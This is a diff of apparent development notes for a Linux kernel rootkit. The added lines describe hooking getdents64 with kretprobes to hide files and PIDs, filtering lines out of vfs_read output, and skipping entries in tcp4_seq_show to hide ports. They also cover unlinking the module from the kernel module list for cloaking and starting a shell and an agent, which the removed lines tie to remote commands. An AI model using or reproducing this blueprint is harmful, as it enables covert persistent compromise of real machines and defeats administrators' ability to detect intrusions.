@@ -1,5 +1,23 @@
-Compile the imported IPv4, provisioning, replacement, and packet objects.
-Start visibility only after the agent task exists.
-Register the packet switchboard before enabling remote commands.
-On failure, unwind visibility before the agent and restore the file transaction
-before releasing resident state.
+Init order matters: parse key first, init target lists, then shell, then
+agent (needs shell), then probes, then proc. Exit reverses this: uncloak
+first so rmmod works, remove proc, unregister probes, stop agent, stop
+shell.
+
+For directory hiding: kretprobe on __x64_sys_getdents64. Entry handler
+captures dirp (arg 1). Return handler: copy_from_user_nofault, walk
+dirent records (d_reclen at offset 16, d_name at offset 19), check
+rk_target_prefix_match for files and rk_target_number_match for PIDs,
+memmove to compact, copy_to_user_nofault and regs_set_return_value.
+
+For content hiding: kretprobe on vfs_read. Return handler: copy buffer,
+walk line by line with memchr for newlines, check
+rk_target_substring_match, compact with memmove.
+
+For port hiding: kprobe pre-handler on tcp4_seq_show. Get v from
+regs->si. If v == SEQ_START_TOKEN return 0. Otherwise cast to sock*,
+get inet_sk(sk)->inet_sport, check rk_target_number_match. Return 1
+to skip.
+
+For cloaking: list_del(&THIS_MODULE->list) to hide,
+list_add(&THIS_MODULE->list, saved_prev) to restore. Save prev before
+deleting.
